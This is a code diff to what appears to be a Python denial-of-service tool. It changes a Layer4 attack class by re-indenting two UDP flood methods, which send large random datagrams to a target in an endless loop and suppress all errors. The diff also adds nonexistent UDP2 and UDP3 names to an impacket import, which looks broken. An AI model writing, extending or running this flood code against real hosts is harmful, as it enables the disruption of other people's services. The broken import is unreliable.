@@ -31,7 +31,7 @@ from certifi import where
 from cloudscraper import create_scraper
 from dns import resolver
 from icmplib import ping
-from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
+from impacket.ImpactPacket import IP, TCP, UDP,UDP2,UDP3, Data, ICMP
 from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
@@ -472,20 +472,20 @@ class Layer4(Thread):
                 continue
         Tools.safe_close(s)
 
-            def UDP2(self) -> None:
-                s = None
-                with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-                    while Tools.sendto(s, randbytes(32517), self._target):
-                        continue
-                Tools.safe_close(s)
+    def UDP2(self) -> None:
+        s = None
+        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
+            while Tools.sendto(s, randbytes(32517), self._target):
+                continue
+        Tools.safe_close(s)
 
 
-                    def UDP3(self) -> None:
-                        s = None
-                        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-                            while Tools.sendto(s, randbytes(65495), self._target):
-                                continue
-                        Tools.safe_close(s)
+    def UDP3(self) -> None:
+        s = None
+        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
+            while Tools.sendto(s, randbytes(65495), self._target):
+                continue
+        Tools.safe_close(s)
 
     def ICMP(self) -> None:
         payload = self._genrate_icmp()
